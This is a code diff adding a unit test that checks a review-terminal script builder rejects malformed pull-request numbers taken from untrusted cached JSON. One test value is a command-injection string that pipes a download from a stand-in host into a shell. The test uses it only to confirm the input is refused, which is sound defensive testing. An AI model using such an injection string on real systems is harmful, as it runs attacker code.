@@ -56,6 +56,14 @@ describe("buildReviewTerminalScript", () => {
     expect(() => buildReviewTerminalScript(prItem({ kind: "issue_assigned" }))).toThrow();
     expect(() => buildReviewTerminalScript(prItem({ localPath: undefined }))).toThrow();
   });
+
+  test("refuses a non-integer PR number that could break out of the script", () => {
+    // number is typed as a number, but it round-trips through untrusted JSON
+    // (snapshot.json / github-cache.json) that is parsed and cast blindly.
+    expect(() => buildReviewTerminalScript(prItem({ number: "1; curl evil|sh #" as unknown as number }))).toThrow();
+    expect(() => buildReviewTerminalScript(prItem({ number: -1 }))).toThrow();
+    expect(() => buildReviewTerminalScript(prItem({ number: 1.5 }))).toThrow();
+  });
 });
 
 describe("terminalScriptFileName", () => {
